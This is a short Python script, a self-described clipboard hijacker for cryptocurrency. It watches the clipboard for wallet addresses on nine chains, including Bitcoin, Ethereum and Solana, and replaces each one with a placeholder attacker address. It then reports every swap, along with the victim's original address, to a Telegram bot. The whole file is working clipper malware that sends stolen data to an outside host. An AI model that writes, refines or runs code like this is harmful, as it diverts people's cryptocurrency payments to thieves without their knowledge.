import pyperclip
import time
import re
import requests

# Your bot token and chat ID
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_I"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"[!] Telegram Error: {e}")

wallets = {
    "BTC":  "bc1qexample000000000000000000000000000000000",
    "ETH":  "0x000000000000000000000000000000000000dEaD",
    "BNB":  "0x000000000000000000000000000000000000dEaD",
    "LTC":  "ltc1qexample0000000000000000000000000000000",
    "TRX":  "TXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
    "SOL":  "11111111111111111111111111111111",
    "ADA":  "addr1qexample000000000000000000000000000000000000000000000000000000",
    "DOGE": "DExampleWalletAddr000000000000000000",
    "XRP":  "rExampleWalletAddress000000000000000"
}


patterns = {
    'BTC': r'^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,39}$',
    'ETH': r'^0x[a-fA-F0-9]{40}$',
    'BNB': r'^0x[a-fA-F0-9]{40}$',
    'LTC': r'^(ltc1|[LM3])[a-zA-HJ-NP-Z1-9]{26,42}$',
    'TRX': r'^T[a-zA-Z0-9]{33}$',
    'SOL': r'^[1-9A-HJ-NP-Za-km-z]{32,44}$',
    'ADA': r'^addr1[a-z0-9]{30,}$',
    'DOGE': r'^D{1}[5-9A-HJ-NP-Ua-km-z]{32}$',
    'XRP': r'^r[1-9A-HJ-NP-Za-km-z]{25,35}$',
}

def detect_wallet(text):
    for chain, pattern in patterns.items():
        if re.match(pattern, text):
            return chain
    return None

def main():
    print("[*] Clipboard hijacker with Telegram running...")
    last_clip = ""
    while True:
        try:
            current = str(pyperclip.paste()).strip()
            if current != last_clip:
                chain = detect_wallet(current)
                if chain:
                    replacement = wallets[chain]
                    pyperclip.copy(replacement)
                    log = f"📋 Detected {chain} wallet:\n{current}\n✅ Replaced with:\n{replacement}"
                    print(log)
                    send_telegram(log)
                    last_clip = replacement
                else:
                    last_clip = current
            time.sleep(0.5)
        except Exception as e:
            print(f"[!] Error: {e}")
            send_telegram(f"❌ Error in hijacker: {e}")
            break

if __name__ == "__main__":
    main()
